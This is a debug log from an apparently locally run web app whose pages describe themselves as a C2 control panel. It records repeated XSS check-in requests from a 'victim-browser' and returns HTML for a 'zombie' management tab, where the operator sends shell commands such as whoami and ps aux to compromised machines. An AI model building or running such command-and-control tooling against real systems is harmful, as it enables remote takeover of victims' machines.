2025-06-24 23:11:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:43] "[35m[1mGET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 500 -
2025-06-24 23:11:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:11:44 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:11:44 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('victim-browser', 'XSS_GET_signal', None, '2025-06-24 23:11:44.171520', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:11:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0011s) -> 回傳: (<Response 384 bytes [200 OK]>, 500)
2025-06-24 23:11:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:44] "[35m[1mGET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 500 -
2025-06-24 23:11:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:11:44 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:11:44 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('victim-browser', 'XSS_GET_signal', None, '2025-06-24 23:11:44.468358', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:11:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0017s) -> 回傳: (<Response 384 bytes [200 OK]>, 500)
2025-06-24 23:11:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:44] "[35m[1mGET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 500 -
2025-06-24 23:11:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:11:44 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:11:44 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('victim-browser', 'XSS_GET_signal', None, '2025-06-24 23:11:44.663685', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:11:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0009s) -> 回傳: (<Response 384 bytes [200 OK]>, 500)
2025-06-24 23:11:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:44] "[35m[1mGET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 500 -
2025-06-24 23:11:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:11:44 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:11:44 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('victim-browser', 'XSS_GET_signal', None, '2025-06-24 23:11:44.898970', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:11:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0008s) -> 回傳: (<Response 384 bytes [200 OK]>, 500)
2025-06-24 23:11:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:44] "[35m[1mGET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 500 -
2025-06-24 23:11:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:11:47 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:11:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0009s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:11:42.123832</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:11:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:47] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:11:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:47] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:11:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:47] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:11:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:11:54 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:11:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0014s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:11:42.123832</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:11:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:54] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:11:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:54] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:11:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:54] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:12:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:12:09 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:12:09 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('victim-browser', 'XSS_GET_signal', None, '2025-06-24 23:12:09.719836', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:12:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0012s) -> 回傳: (<Response 384 bytes [200 OK]>, 500)
2025-06-24 23:12:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:09] "[35m[1mGET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 500 -
2025-06-24 23:12:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:12:11 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:12:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                  